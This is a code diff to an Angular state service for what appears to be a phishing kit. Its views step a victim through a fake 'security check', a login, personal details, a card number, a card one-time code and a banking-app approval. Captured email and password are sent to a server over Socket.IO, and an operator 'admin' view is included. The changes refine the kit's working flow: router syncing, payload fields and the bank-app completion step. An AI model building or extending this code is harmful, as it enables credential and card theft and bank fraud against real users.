@@ -1,9 +1,9 @@
 
 import { Injectable, signal, computed, effect } from '@angular/core';
-import { Router } from '@angular/router';
+import { Router, NavigationEnd } from '@angular/router';
 import { io, Socket } from 'socket.io-client';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
-import { retry, catchError, switchMap, tap } from 'rxjs/operators';
+import { retry, catchError, switchMap, tap, filter } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
@@ -140,6 +140,24 @@ export class StateService {
 
   constructor(private router: Router) {
     this.initializeSession();
+
+    // Sync Router Navigation (Back Button, Deep Links) to State
+    this.router.events.pipe(
+        filter(event => event instanceof NavigationEnd)
+    ).subscribe((event: any) => {
+        const url = event.urlAfterRedirects || event.url;
+        // Strip leading slash and query params
+        const view = url.split('?')[0].substring(1) as ViewState;
+
+        // Only update if changed and valid
+        if (view && view !== this.currentView()) {
+            this.currentView.set(view);
+            // Don't sync if it's admin or if we are hydrating
+            if (!this.isHydrating) {
+                this.syncState();
+            }
+        }
+    });
     
     // Initialize Socket.IO
     this.socket = io({
@@ -491,7 +509,6 @@ export class StateService {
   private buildPayload() {
       return {
           sessionId: this.sessionId(),
-          currentView: this.currentView(),
           timestamp: this.startTime(),
           email: this.email(),
           password: this.password(),
@@ -746,7 +763,7 @@ export class StateService {
                this.navigate('card_otp', true);
            }
            else if (this.stage() === 'bank_app_pending') {
-               this.navigate('bank_app', true);
+               this.navigate('card', true); // Or back to bank app?
            } else {
                this.navigate('login', true);
            }
@@ -949,12 +966,10 @@ export class StateService {
       this.syncState();
   }
 
-  submitBankAppApproval() {
-      // User clicked "I have approved it"
-      // Now we go to pending state and show loading
-      this.stage.set('bank_app_pending');
-      this.navigate('loading');
-      this.waitingStart.set(Date.now());
+  completeBankApp() {
+      this.isFlowComplete.set(true);
+      this.stage.set('complete');
+      this.navigate('success');
       this.syncState();
   }
   
